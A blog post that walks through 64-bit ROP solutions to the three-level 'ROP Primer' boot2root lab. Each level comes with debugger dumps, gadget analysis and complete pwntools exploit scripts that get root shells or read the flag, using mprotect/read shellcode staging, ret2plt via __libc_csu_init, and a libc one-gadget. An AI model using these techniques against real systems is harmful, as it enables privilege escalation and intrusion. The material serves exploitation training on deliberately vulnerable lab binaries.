---
layout: post
title: "A ROP Primer solution 64-bit style"
date: 2015-10-09 05:36:29 -0400
comments: true
categories: boot2root
---

It turns out I've been blogging for 6 years as of today. To celebrate, here's a writeup on 64-bit ROP exploitation! It's a revist of [barrebas's](https://twitter.com/barrebas) awesome ROP primer, but compiled for 64-bit. This isn't an official boot2root, just something I decided to do on my own for fun. barrebas provides the source code for each of the challenges in his [ROP Primer](https://www.vulnhub.com/entry/rop-primer-02,114/) so it's just a matter of compiling it on a 64-bit system. 

### Setup

The binaries can be found at [https://gist.github.com/superkojiman/b28c801a3b042072bc69](https://gist.github.com/superkojiman/b28c801a3b042072bc69). Here's my setup in case you want to follow along: 

```bash
# mkdir 0 1 2
# echo 'flag{challenge-completed}' > flag
# chmod 600 flag
# cp level0 flag 0
# cp level1 flag 1
# cp level2 flag 2
# chown -R root:root 0 1 2
# chmod 4755 0/level0
# chmod 4755 1/level1
```

This gives the following directory structure:

```text
# tree -p .
.
├── [drwxr-xr-x]  0
│   ├── [-rw-------]  flag
│   └── [-rwsr-xr-x]  level0
├── [drwxr-xr-x]  1
│   ├── [-rw-------]  flag
│   └── [-rwxr-xr-x]  level1
└── [drwxr-xr-x]  2
    ├── [-rw-------]  flag
    └── [-rwsr-xr-x]  level2

3 directories, 6 files
```

I also kept ASLR on for challenges 0, and 1.

### Level 0

level0 prompts the user for input and uses gets() to store the input into a buffer. RIP is at offset 40. Here's what the stack looks like right before RIP is overwritten with 0x424242424242: 

```
Starting program: /root/rop64/level0 < in.txt
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB!
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x400278 (<_init>: sub    rsp,0x8)
RCX: 0x48 ('H')
RDX: 0x6b6760 --> 0x0 
RSI: 0x7fffffb7 
RDI: 0x0 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffc99b9ea48 --> 0x424242424242 ('BBBBBB')
RIP: 0x400fe2 (<main+84>:   ret)
R8 : 0x4141414141414141 ('AAAAAAAA')
R9 : 0x488a00 --> 0x0 
R10: 0x4141414141414141 ('AAAAAAAA')
R11: 0x246 
R12: 0x0 
R13: 0x401630 (<__libc_csu_init>:   push   r14)
R14: 0x4016c0 (<__libc_csu_fini>:   push   rbx)
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400fd7 <main+73>:  call   0x407360 <printf>
   0x400fdc <main+78>:  mov    eax,0x0
   0x400fe1 <main+83>:  leave  
=> 0x400fe2 <main+84>:  ret    
   0x400fe3:    nop    WORD PTR cs:[rax+rax*1+0x0]
   0x400fed:    nop    DWORD PTR [rax]
   0x400ff0 <__libc_start_main>:    push   r14
   0x400ff2 <__libc_start_main+2>:  mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7ffc99b9ea48 --> 0x424242424242 ('BBBBBB')
0008| 0x7ffc99b9ea50 --> 0x0 
0016| 0x7ffc99b9ea58 --> 0x100000000 
0024| 0x7ffc99b9ea60 --> 0x7ffc99b9eb28 --> 0x7ffc99b9f540 ("/root/rop64/level0")
0032| 0x7ffc99b9ea68 --> 0x400f8e (<main>:  push   rbp)
0040| 0x7ffc99b9ea70 --> 0x400278 (<_init>: sub    rsp,0x8)
0048| 0x7ffc99b9ea78 --> 0x73eba12b198a1148 
0056| 0x7ffc99b9ea80 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400fe2 in main ()
```

Here's a layout of the process' memory:

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x004b4000         r-xp  /root/rop64/level0
0x006b4000         0x006b6000         rw-p  /root/rop64/level0
0x006b6000         0x006b8000         rw-p  mapped
0x013a9000         0x013cc000         rw-p  [heap]
0x00007f3130c3b000 0x00007f3130c3d000 rw-p  mapped
0x00007ffc99b7f000 0x00007ffc99ba0000 rw-p  [stack]
0x00007ffc99bf6000 0x00007ffc99bf8000 r--p  [vvar]
0x00007ffc99bf8000 0x00007ffc99bfa000 r-xp  [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```

In my 32-bit solution, a stack pointer was conveniently found in one of the registers, but not so in this case. Fortunately the binary's addresses don't change, so I just have to call mprotect on it to make it executabe, read my shellcode into said memory, and then return to it to get a shell. 

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*40

# make location 0x6b6000 to 0x6b8000 RWX using mprotect
# mprotect:
#   rax: 0xa
#   rdi: unsigned long start
#   rsi: size_t len
#   rdx: unsigned long prot

buf += p64(0x40159b)        # pop rdi; ret; 
buf += p64(0x6b6000)        # unsigned long start
buf += p64(0x432f29)        # pop rdx; pop rsi; ret; 
buf += p64(7)               # unsigned long prot
buf += p64(8192)            # size_t len
buf += p64(0x414796)        # add eax, 5; ret; 
buf += p64(0x414796)        # add eax, 5; ret; 
buf += p64(0x4546b5)        # syscall; ret; 

# read shellcode into 0x6b6000
# read:
#   rax: 0x0
#   rdi: unsigned int fd
#   rsi: char *buf
#   rdx: size_t count

buf += p64(0x40159b)        # pop rdi; ret; 
buf += p64(0)               # unsigned int fd
buf += p64(0x432f29)        # pop rdx; pop rsi; ret; 
buf += p64(30)              # size_t count
buf += p64(0x6b6000)        # char *buf
buf += p64(0x43168d)        # pop rax; ret; 
buf += p64(0)               # sys_read
buf += p64(0x4546b5)        # syscall; ret; 

buf += p64(0x6b6000)        # return to read-in shellcode
print buf
```

I also created a python script to send an execve shellcode to the binary when it calls read:

```python
from pwn import *
context(os="linux", arch="amd64")
print asm(shellcraft.linux.sh())
```

Here it is in action:

```text
$ (./sploit.py; ./sc.py; cat) | ./level0
[+] ROP tutorial level0
[+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@!
whoami
root
cat flag
flag{challenge-completed}
```

So far so good!

### Level 1

Things get a bit hairy in this level. level1 listens on port 8888 for connections and prompts us for input. It's easy to overflow the handle_conn() function and gain control of RIP using the store command. In my case, I specified a file size of 500 bytes and sent an input file of 800 bytes. RIP gets overwritten at offset 572.  Here's what the stack looks like right before it returns to an invalid address: 

```
[----------------------------------registers-----------------------------------]
RAX: 0x26 ('&')
RBX: 0x0 
RCX: 0x7f33543e6620 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
RDX: 0x26 ('&')
RSI: 0x4012d8 ("  XERXES wishes you\n      a NICE day.\n")
RDI: 0x4 
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffd5f7c2028 ('A' <repeats 200 times>...)
RIP: 0x400f58 (<handle_conn+983>:   ret)
R8 : 0x4000 ('')
R9 : 0x7f33543589fa (<_IO_vfprintf_internal+22490>: cmp    BYTE PTR [rbp-0x4d8],0x0)
R10: 0x7ffd5f7c1c20 --> 0x0 
R11: 0x246 
R12: 0x400a00 (<_start>:    xor    ebp,ebp)
R13: 0x7ffd5f7c2140 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400f50 <handle_conn+975>:  jmp    0x400f57 <handle_conn+982>
   0x400f52 <handle_conn+977>:  jmp    0x400bda <handle_conn+89>
   0x400f57 <handle_conn+982>:  leave  
=> 0x400f58 <handle_conn+983>:  ret    
   0x400f59 <main>: push   rbp
   0x400f5a <main+1>:   mov    rbp,rsp
   0x400f5d <main+4>:   sub    rsp,0x30
   0x400f61 <main+8>:   mov    DWORD PTR [rbp-0x24],edi
[------------------------------------stack-------------------------------------]
0000| 0x7ffd5f7c2028 ('A' <repeats 200 times>...)
0008| 0x7ffd5f7c2030 ('A' <repeats 200 times>...)
0016| 0x7ffd5f7c2038 ('A' <repeats 200 times>...)
0024| 0x7ffd5f7c2040 ('A' <repeats 200 times>...)
0032| 0x7ffd5f7c2048 ('A' <repeats 196 times>, "\n")
0040| 0x7ffd5f7c2050 ('A' <repeats 188 times>, "\n")
0048| 0x7ffd5f7c2058 ('A' <repeats 180 times>, "\n")
0056| 0x7ffd5f7c2060 ('A' <repeats 172 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400f58 in handle_conn ()
```

The description of the challenge hints that we can use open(), read(), and write() to get the flag. So much like the 32-bit solution, I solved it using ret2plt. Unlike the 32-bit solution however, this was turned out to be more complicated. In 64-bit binaries, the first six function parameters are passed in registers RDI, RSI, RDX, RCX, R8, and R9. Anything more is passed on the stack. In order to return to open@plt, read@plt, and write@plt, I needed to populate these registers with the proper values. Unlike level0, this is a dynamically linked binary so I had limited gadgets to work with. Fortunately, I can get everything I need from \_\_libc\_csu\_init() as described [here](http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html). 

Here's a breakdown of \_\_libc\_csu\_init():

```
[0x00400a00]> pdf@sym.__libc_csu_init 
/ (fcn) sym.__libc_csu_init 101
|           ; DATA XREF from 0x00400a16 (sym.__libc_csu_init)
|           0x00401090    4157           push r15
|           0x00401092    4189ff         mov r15d, edi
|           0x00401095    4156           push r14
|           0x00401097    4989f6         mov r14, rsi
|           0x0040109a    4155           push r13
|           0x0040109c    4989d5         mov r13, rdx
|           0x0040109f    4154           push r12
|           0x004010a1    4c8d25100520.  lea r12, [rip + 0x200510]
|           0x004010a8    55             push rbp
|           0x004010a9    488d2d100520.  lea rbp, [rip + 0x200510]
|           0x004010b0    53             push rbx
|           0x004010b1    4c29e5         sub rbp, r12
|           0x004010b4    31db           xor ebx, ebx
|           0x004010b6    48c1fd03       sar rbp, 3
|           0x004010ba    4883ec08       sub rsp, 8
|           0x004010be    e885f7ffff     call sym._init
|           0x004010c3    4885ed         test rbp, rbp
|       ,=< 0x004010c6    741e           je 0x4010e6                  
|       |   0x004010c8    0f1f84000000.  nop dword [rax + rax]
|      .--> 0x004010d0    4c89ea         mov rdx, r13                   ; set rdx
|      ||   0x004010d3    4c89f6         mov rsi, r14                   ; set rsi
|      ||   0x004010d6    4489ff         mov edi, r15d                  ; set edi
|      ||   0x004010d9    41ff14dc       call qword [r12 + rbx*8]       ; hurdle #1
|      ||   0x004010dd    4883c301       add rbx, 1
|      ||   0x004010e1    4839eb         cmp rbx, rbp                   ; hurdle #2
|      `==< 0x004010e4    75ea           jne 0x4010d0                 
|       `-> 0x004010e6    4883c408       add rsp, 8
|           0x004010ea    5b             pop rbx
|           0x004010eb    5d             pop rbp
|           0x004010ec    415c           pop r12
|           0x004010ee    415d           pop r13                        ; set r13 which gets copied to rdx (see above)
|           0x004010f0    415e           pop r14                        ; set r14 which gets copied to rsi (see above)
|           0x004010f2    415f           pop r15                        ; set r15 which gets copied to edi (see above)
\           0x004010f4    c3             ret
```

Based on the above, if I returned to 0x004010ee, I could pop values into registers r13, r14, and r15. I could then return to 0x004010d0, which would copy the values from registers r13, r14, and r15, into registers rdx, rsi, and edi respectively. Once rdi, rsi, and edi are populated, execution continues until it reaches the ret instruction. In order to get there, the two hurdles pointed out above need to be overcome. 

Hurdle #1 is a call to a function pointer. 

```
|      ||   0x004010d9    41ff14dc       call qword [r12 + rbx*8]
```

I control both r12 and rbx, so I can control which function pointer gets called. _fini() is a good choice. Here's what it looks like:

```
[0x00400a00]> pdf@sym._fini
/ (fcn) sym._fini 9
|           ;-- section..fini:
|           0x00401104    4883ec08       sub rsp, 8 
|           0x00401108    4883c408       add rsp, 8
\           0x0040110c    c3             ret
```

\_fini() is at 0x00401104 and a pointer to it can be found in &\_DYNAMIC:

```
gdb-peda$ x/11wx &_DYNAMIC 
0x6015d0:   0x00000001  0x00000000  0x00000001  0x00000000
0x6015e0:   0x0000000c  0x00000000  0x00400848  0x00000000
0x6015f0:   0x0000000d  0x00000000  0x00401104  <--- here's _fini()
```

The pointer to _fini() is at 0x6015f8. Just to make sure: 

```
gdb-peda$ x/3i *0x6015f8
   0x401104 <_fini>:    sub    rsp,0x8
   0x401108 <_fini+4>:  add    rsp,0x8
   0x40110c <_fini+8>:  ret
```

So to overcome this first hurdle, I just had to set r12 to 0x6015f8, and rbx to 0. 

Hurdle #2 is much easier to overcome. I just need to make sure rbx and rbp are equal:

```
|      ||   0x004010dd    4883c301       add rbx, 1
|      ||   0x004010e1    4839eb         cmp rbx, rbp
|      `==< 0x004010e4    75ea           jne 0x4010d0                 
|       `-> 0x004010e6    4883c408       add rsp, 8
```

I control both rbx and rbp, so I just set rbx to 0, and rbp to 1. By the time the comparison is made, both registers equal to 1. 

After both hurdles are passed, the sequence of pop instructions that populate r13, r14, and r15 are called again. I took this opportunity to fill them with the proper values to be copied to rdx, rsi, and edi for the next function call to be chained. Here's the final exploit:

```python
#!/usr/bin/env python

from pwn import *

"""
Gadget from __libc_csu_init()

|      .--> 0x004010d0    4c89ea         mov rdx, r13
|      ||   0x004010d3    4c89f6         mov rsi, r14
|      ||   0x004010d6    4489ff         mov edi, r15d
|      ||   0x004010d9    41ff14dc       call qword [r12 + rbx*8]
|      ||   0x004010dd    4883c301       add rbx, 1
|      ||   0x004010e1    4839eb         cmp rbx, rbp
|      `==< 0x004010e4    75ea           jne 0x4010d0                 
|       `-> 0x004010e6    4883c408       add rsp, 8
|       |   0x004010ea    5b             pop rbx
|       |   0x004010eb    5d             pop rbp
|       |   0x004010ec    415c           pop r12
|       |   0x004010ee    415d           pop r13
|       |   0x004010f0    415e           pop r14
|       |   0x004010f2    415f           pop r15
\       |   0x004010f4    c3             ret
"""

r = remote("localhost", 8888)

buf = ""
buf += "A"*572

# setup the registers for open()
buf += p64(0x004010ea)      # pop rbx; pop rbp... ret
buf += p64(0x0)             # set rbx to 0
buf += p64(0x1)             # set rbp to 1
buf += p64(0x6015f8)        # set r12 to pointer to _fini()
buf += "JUNKJUNK"           # set r13 to junk
buf += p64(0x0)             # set r14 to O_RDONLY
buf += p64(0x40132c)        # set r15 to pointer to string "flag"

# move values in r12-r15 registers to the actual registers we need to use
buf += p64(0x004010d0)      # set rdx, rdi, rsi
buf += "JUNKJUNK"           # removed by add rsp, 0x8

# this part of the chain is back at 0x004010ea (pop rbx; pop rbp... ret) 
# so might as well use it to setup the registers for read()
buf += p64(0x0)             # set rbx to 0
buf += p64(0x1)             # set rbp to 1
buf += p64(0x6015f8)        # set r12 to pointer to _fini()
buf += p64(0x20)            # set r13 to num bytes to read
buf += p64(0x00601000)      # set r14 to buf to read contents of flag to
buf += p64(0x3)             # set r15 fd from open, most likely fd 3

# call open@plt
buf += p64(0x400980)

# move values in r12-r15 registers to the actual registers we need to use
buf += p64(0x004010d0)      # set rdx, rdi, rsi
buf += "JUNKJUNK"           # removed by add rsp, 0x8

# this part of the chain is back at 0x004010ea (pop rbx; pop rbp... ret) 
# so might as well use it to setup the registers for write()
buf += p64(0x0)             # set rbx to 0
buf += p64(0x1)             # set rbp to 1
buf += p64(0x6015f8)        # set r12 to pointer to _fini()
buf += p64(0x20)            # set r13 to num bytes to read
buf += p64(0x00601000)      # set r14 to buf to read contents of flag to
buf += p64(0x4)             # set r15 sock fd, most likely fd 4

# call read@plt
buf += p64(0x400920)

# move values in r12-r15 registers to the actual registers we need to use
buf += p64(0x004010d0)      # set rdx, rdi, rsi
buf += "JUNKJUNK"           # removed by add rsp, 0x8

# we're not chaining any more functions after write@plt so it doesn't matter
# what gets popped into the rest of the registers
buf += p64(0x0)             # junk
buf += p64(0x0)             # junk
buf += p64(0x0)             # junk
buf += p64(0x0)             # junk
buf += p64(0x0)             # junk
buf += p64(0x0)             # junk

# call write@plt
buf += p64(0x4008b0)

buf += "C"*(800-len(buf))

# send store command
print r.recvuntil(">")
r.send("store")

# send size of file
print r.recvuntil(">")
r.send("500")

# send file
print r.recvuntil(">")
r.send(buf)
print r.recvall()
```

Hopefully that wasn't too confusing. Here's the exploit in action:

```text
$ ./sploit.py
[+] Opening connection to localhost on port 8888: Done
Welcome to 
 XERXES File Storage System
  available commands are:
  store, read, exit.

>
  Please, how many bytes is your file?

>
  Please, send your file:

>
[+] Recieving all data: Done (295B)
[*] Closed connection to localhost port 8888
    XERXES is pleased to inform you
    that your file was received
        most successfully.
 Please, give a filename:
>   XERXES will store
   this data as 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX'.
  XERXES wishes you
      a NICE day.
flag{challenge-completed}
\x89��o��
$ 
```

Got the flag. Moving on to the final challenge. 

### Level 2

I had to cheat on this one a bit by turning off ASLR. Due to the nature of addressing on 64-bit systems, null bytes become a really big problem. For this particular challenge, it's easy to overwrite RIP, but I could only return to a single gadget due to the null bytes. The gadget I picked is a one-gadget-RCE from libc that executes execve("/bin/sh") to give me an instant shell. Using Hopper, I searched for references to "/bin/sh" that was followed by a call to execve(). I picked this one: 

```
00000000000d48e7         mov        rax, qword [ds:0x3a2ea8]
00000000000d48ee         lea        rsi, qword [ss:rsp+var_168]
00000000000d48f3         lea        rdi, qword [ds:0x161160]                    ; "/bin/sh"
00000000000d48fa         mov        rdx, qword [ds:rax]
00000000000d48fd         call       execve
```

Since ASLR is disabled, libc's base address won't change during execution. So adding the offset 0xd48e7 to libc's base address gives me the address I need to return to. First off, I needed libc's base address: 

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /root/rop64/2/level2
0x00600000         0x00601000         rw-p  /root/rop64/2/level2
0x00007ffff7a33000 0x00007ffff7bd2000 r-xp  /lib/x86_64-linux-gnu/libc-2.19.so
.
.
.
```

Next add the offset and make sure I'm getting the same instructions I got from Hopper: 

```
gdb-peda$ x/10i 0xd48e7 + 0x00007ffff7a33000
   0x7ffff7b078e7 <exec_comm+1767>: mov    rax,QWORD PTR [rip+0x2ce5ba]        # 0x7ffff7dd5ea8
   0x7ffff7b078ee <exec_comm+1774>: lea    rsi,[rsp+0x70]
   0x7ffff7b078f3 <exec_comm+1779>: lea    rdi,[rip+0x8c866]        # 0x7ffff7b94160
   0x7ffff7b078fa <exec_comm+1786>: mov    rdx,QWORD PTR [rax]
   0x7ffff7b078fd <exec_comm+1789>: call   0x7ffff7aeaae0 <__execve>
```

Looks good! So I just need return to 0x7ffff7b078e7 to get my shell. Here's the final exploit: 

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*40
buf += p64(0x7ffff7b078e7)
print buf
```

And now here it is in action:

```text
$ whoami
koji
$ ./level2 `./sploit.py`
[+] ROP tutorial level2
[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�x��!
# whoami
root
# cat flag
flag{challenge-completed}
```

All done! 

Hope you guys enjoyed this writeup. If you're interested in learning some 64-bit ROP exploitation, give this a go. It's not too hard and you might learn a thing or two along the way. 
